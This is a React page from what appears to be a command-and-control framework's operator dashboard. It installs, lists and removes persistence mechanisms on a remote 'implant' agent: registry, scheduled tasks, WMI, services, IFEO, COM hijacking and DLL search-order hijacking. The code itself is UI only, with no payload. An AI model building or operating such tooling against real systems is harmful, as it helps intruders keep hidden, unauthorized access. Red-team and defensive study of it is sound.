"use client";

import { useEffect, useState, useCallback } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import { useConfirm } from "@/lib/hooks/useConfirm";

import { Spinner, PageSpinner } from "@/components/ui/spinner";
import { toast } from "sonner";
import { Card } from "@/components/ui/card";
import { PageContainer } from "@/components/ui/page-container";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { CalendarCheck, Cog, Boxes, FolderOpen, Puzzle, Server, Settings } from "lucide-react";
import { Bug, Info, Link as LinkIcon, ListChecks, Plug, RotateCw, Trash2 } from "lucide-react";

import type { AgentDetail } from "@/types/agent";
import { persistenceMethodQuality, type DestQuality } from "../_components/dest-quality";
import { implantBlocksDest } from "../../_components/implant-version";

function PersistQualityMark({ quality }: { quality: DestQuality }) {
  const { t } = useI18n();
  if (quality === "experimental") return <>{t("generate.quality_experimental")}</>;
  if (quality === "scripted") return <>{t("cred.quality_scripted")}</>;
  if (quality === "core") return <>{t("generate.quality_core")}</>;
  return <>{t("generate.quality_hardened")}</>;
}

const PERSISTENCE_METHODS: { key: string; labelKey: string; icon: React.ReactNode }[] = [
  { key: "registry", labelKey: "agents.persistence_registry", icon: <Settings className="w-4 h-4" /> },
  { key: "scheduled_task", labelKey: "agents.persistence_scheduled_task", icon: <CalendarCheck className="w-4 h-4" /> },
  { key: "startup_folder", labelKey: "agents.persistence_startup_folder", icon: <FolderOpen className="w-4 h-4" /> },
  { key: "wmi", labelKey: "agents.persistence_wmi", icon: <Cog className="w-4 h-4" /> },
  { key: "service", labelKey: "agents.persistence_service", icon: <Server className="w-4 h-4" /> },
  { key: "image_file", labelKey: "agents.persistence_ifeo", icon: <Puzzle className="w-4 h-4" /> },
  { key: "com_hijack", labelKey: "agents.persistence_com_hijack", icon: <Boxes className="w-4 h-4" /> },
  { key: "dll_search_order", labelKey: "agents.persistence_dll_hijack", icon: <LinkIcon className="w-4 h-4" /> },
];

export default function AgentPersistencePage() {
  const { t } = useI18n();
  const params = useParams();
  const id = params?.id as string;
  const [agent, setAgent] = useState<AgentDetail | null>(null);
  const [loading, setLoading] = useState(true);
  const [installedMethods, setInstalledMethods] = useState<string[]>([]);
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [listOutput, setListOutput] = useState<string | null>(null);
  const [listLoading, setListLoading] = useState(false);


  const loadAgent = useCallback(async () => {
    if (!id) return;
    try {
      const data = await api.get(paths.agents.one(id));
      setAgent(data.agent || data);
    } catch {
      toast.error(t("agents.persistence_load_failed"));
    } finally {
      setLoading(false);
    }
  }, [id, t]);

  const listPersistence = useCallback(async () => {
    if (!id) return;
    setListLoading(true);
    try {
      const data = await api.post(paths.agents.persistence(id), { action: "list" });
      if (data.success) {
        toast.success(t("agents.persistence_list_success"));
        for (let attempt = 0; attempt < 10; attempt++) {
          await new Promise((resolve) => setTimeout(resolve, 1500));
          const tasks = await api.get<{ tasks?: Array<{ type: string; result: string }> }>(
            paths.agents.tasks(id),
          );
          const latest = (tasks.tasks || []).find(
            (task) => task.type === "persistence_list" && task.result && task.result.trim(),
          );
          if (latest) {
            setListOutput(latest.result);
            break;
          }
        }
      } else {
        toast.error((data.error as string) || t("agents.persistence_load_failed"));
      }
    } catch (e) {
      toast.error(String(e));
    } finally {
      setListLoading(false);
    }
  }, [id, t]);

  useEffect(() => { loadAgent(); }, [loadAgent]);
  useEffect(() => { if (id) listPersistence(); }, [id, listPersistence]);
  const confirmDialog = useConfirm();

  const addPersistence = async (method: string) => {
    if (!id) return;
    if (implantBlocksDest(agent?.version, persistenceMethodQuality(method))) {
      toast.error(t("agents.version_unknown_dest"));
      return;
    }
    const okInstall = await confirmDialog.confirm({ message: t("agents.persistence_install") + "?", danger: true });
    if (!okInstall) return;
    setActionLoading(method);
    try {
      const data = await api.post(paths.agents.persistence(id), { action: "add", method });
      if (data.success) {
        setInstalledMethods((prev) => (prev.includes(method) ? prev : [...prev, method]));
        toast.success(t("agents.persistence_task_queued", { id: String(data.task_id ?? "") }));
      } else {
        toast.error((data.error as string) || t("agents.persistence_install_failed"));
      }
    } catch (e) {
      toast.error(String(e));
    } finally {
      setActionLoading(null);
    }
  };

  const removePersistence = async (method: string) => {
    if (!id) return;
    const okRemove = await confirmDialog.confirm({ message: t("agents.persistence_remove") + "?", danger: true });
    if (!okRemove) return;
    setActionLoading(`remove_${method}`);
    try {
      const data = await api.post(paths.agents.persistence(id), { action: "remove", method });
      if (data.success) {
        setInstalledMethods((prev) => prev.filter((m) => m !== method));
        toast.success(t("agents.persistence_task_queued", { id: String(data.task_id ?? "") }));
      } else {
        toast.error((data.error as string) || t("agents.persistence_remove_failed"));
      }
    } catch (e) {
      toast.error(String(e));
    } finally {
      setActionLoading(null);
    }
  };

  const agentStatus = agent?.status || "offline";
  const statusColor = agentStatus === "online" ? "bg-success" : agentStatus === "stale" ? "bg-warning" : "bg-destructive";
  const hostname = agent?.hostname || t("agents.unknown");

  if (loading) {
    return <PageContainer><PageSpinner /></PageContainer>;
  }

  if (!agent) {
    return (
      <PageContainer>
        <div className="text-center py-20">
          <Bug className="w-4 h-4" aria-hidden="true" />
          <h2 className="text-xl font-semibold text-foreground mb-2">{t("agents.persistence_not_found_title")}</h2>
          <p className="text-sm text-muted-foreground mb-6">{t("agents.persistence_not_found_desc")}</p>
          <Button render={<Link href="/agents" />}>
              {t("agents.persistence_back_to_agents")}
          </Button>
        </div>
      </PageContainer>
    );
  }

  return (
    <PageContainer>
      <Card className="p-4 sm:p-5 mb-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-14 h-14 rounded-lg bg-primary/15 flex items-center justify-center">
              <LinkIcon className="w-4 h-4" aria-hidden="true" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-2xl font-bold text-foreground">{hostname}</h1>
                <span className={`w-2.5 h-2.5 rounded-full ${statusColor}`}></span>
                <span className="text-xs font-medium text-muted-foreground">{agentStatus.toUpperCase()}</span>
              </div>
              <p className="text-sm text-muted-foreground mt-1">{t("agents.persistence_title")}</p>
            </div>
          </div>
          <Button
            onClick={listPersistence}
            size="sm"
            className="flex items-center gap-1.5"
          >
            <RotateCw className="w-4 h-4" aria-hidden="true" /> {t("agents.persistence_refresh_list")}
          </Button>
        </div>
      </Card>

      <Card className="p-3 mb-4 border-warning/40 bg-warning/10 text-sm text-warning-foreground">
        <div className="font-semibold">{t("agents.persistence_honesty_title")}</div>
        <div className="text-xs text-muted-foreground mt-0.5">{t("agents.persistence_honesty_desc")}</div>
      </Card>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-4">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center gap-2 mb-4">
            <Plug className="w-4 h-4" aria-hidden="true" />
            <h3 className="text-sm font-semibold text-foreground">{t("agents.persistence_install")}</h3>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
            {PERSISTENCE_METHODS.map((method) => {
              const quality = persistenceMethodQuality(method.key) ?? "hardened";
              const versionBlocked = implantBlocksDest(agent.version, quality);
              return (
              <Button
                key={method.key}
                onClick={() => addPersistence(method.key)}
                disabled={actionLoading === method.key || versionBlocked}
                title={versionBlocked ? t("agents.version_unknown_dest") : undefined}
                variant="outline"
                size="sm"
                className="flex items-center gap-3 px-4 py-3 h-auto justify-start"
              >
                {actionLoading === method.key ? (
                  <Spinner size="sm" className="shrink-0" />
                ) : (
                  <span className="text-primary shrink-0">{method.icon}</span>
                )}
                <span className="text-left leading-tight">
                  {t(method.labelKey)}
                  <span className="block text-(--fs-micro) font-normal text-muted-foreground">
                    <PersistQualityMark quality={quality} />
                  </span>
                </span>
              </Button>
              );
            })}
          </div>
        </Card>

        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <ListChecks className="w-4 h-4" aria-hidden="true" />
              <h3 className="text-sm font-semibold text-foreground">{t("agents.persistence_installed")}</h3>
            </div>
            <Badge variant="secondary" className="text-(--fs-micro-sm)">{installedMethods.length}</Badge>
          </div>
          {installedMethods.length === 0 ? (
            <div className="text-center py-8">
              <Info className="w-4 h-4 mb-2" />
              <p className="text-xs text-muted-foreground">{t("agents.persistence_no_methods")}</p>
            </div>
          ) : (
            <div className="space-y-2 max-h-[400px] overflow-y-auto">
              {installedMethods.map((method) => {
                const info = PERSISTENCE_METHODS.find((m) => m.key === method);
                const isLoading = actionLoading === `remove_${method}`;
                return (
                  <div
                    key={method}
                    className="flex items-center justify-between px-4 py-3 bg-card border border-border rounded-lg"
                  >
                    <div className="flex items-center gap-3">
                      {info?.icon || <Cog className="w-4 h-4 text-primary" />}
                      <span className="text-sm font-medium text-foreground">{info?.labelKey ? t(info.labelKey) : method}</span>
                    </div>
                    <Button
                      onClick={() => removePersistence(method)}
                      disabled={isLoading}
                      variant="destructive"
                      size="sm"
                      className="flex items-center gap-1"
                    >
                      {isLoading ? (
                        <Spinner size="xs" color="white" />
                      ) : (
                        <Trash2 className="w-4 h-4" />
                      )}
                      {t("agents.persistence_remove")}
                    </Button>
                  </div>
                );
              })}
            </div>
          )}
        {listOutput ? (
            <details className="mt-3">
              <summary className="text-xs font-medium text-muted-foreground cursor-pointer">
                {t("agents.persistence_last_detection")}
              </summary>
              <pre className="mt-2 max-h-60 overflow-auto font-mono text-xs whitespace-pre-wrap bg-muted/40 rounded-lg p-3">
                {listOutput}
              </pre>
            </details>
          ) : (
            listLoading && (
              <div className="mt-3 flex items-center gap-2 text-xs text-muted-foreground">
                <Spinner size="sm" />
                {t("agents.persistence_detecting")}
              </div>
            )
          )}
        </Card>
      </div>
      {confirmDialog.modal}
    </PageContainer>
  );
}
